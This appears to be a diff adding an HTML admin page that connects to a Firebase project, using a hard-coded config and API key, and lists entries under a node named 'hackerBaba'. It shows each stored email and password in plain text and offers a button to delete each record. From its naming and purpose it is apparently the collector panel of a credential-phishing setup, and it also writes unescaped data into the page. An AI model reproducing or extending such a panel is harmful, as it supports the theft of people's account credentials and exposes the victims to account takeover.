@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-database.js"></script>
+<script>
+
+		var firebaseConfig = {
+apiKey: "AIzaSyBFBhTk-2b8erUH_6hBelw8LUNd9JIzkf8",
+authDomain: "loginsignup-e1d8c.firebaseapp.com",
+projectId: "loginsignup-e1d8c",
+storageBucket: "loginsignup-e1d8c.appspot.com",
+messagingSenderId: "437517792151",
+appId: "1:437517792151:web:c6406aba4232ce708ecad2"
+		};
+		firebase.initializeApp(firebaseConfig);
+		
+		</script>
+		<script type="text/javascript">
+		
+		function load(){
+		
+		firebase.database().ref("hackerBaba").on("child_added",function (snapshot){
+		var em= snapshot.val().emailx;
+		var ps =snapshot.val().passx;
+		var edta ="<h3>"+em+"</h3>";
+		var pdta ="<h3>"+ps+"</h3>";	
+			
+
+			var xz="";
+		xz+="<button data-id='"+snapshot.key+"'onclick ='deletex(this);'>";
+		xz+="Delete ";
+		xz+="</button>";
+		
+		var strVar="";
+		strVar += "	<div style=\"background:re\" ><h3 style=\"color:white\" >	"		
+		+edta+"<br>"+pdta+"<br>"+xz+"</h3>"+ "</div>";
+		
+		document.getElementById("cc").innerHTML+=""+'<br>'+strVar;
+		});
+		
+		
+		}
+		
+		function deletex(self){
+		var smsx=self.getAttribute("data-id");
+		firebase.database().ref("hackerBaba").child(smsx).remove();
+		location.reload();
+		}
+		load();
+		</script>
+		
+		
+		<style type="text/css">
+		button{
+		border:2px solid red;
+		}
+		h3{
+		color:#00FF00;
+		}
+		div{
+		border:3px solid blue;
+		background:black ;
+		}
+		</style>
+		<title></title>
+		</head>
+		<body id="cc" style="background:black" >
+	
+
+</body>
+</html>
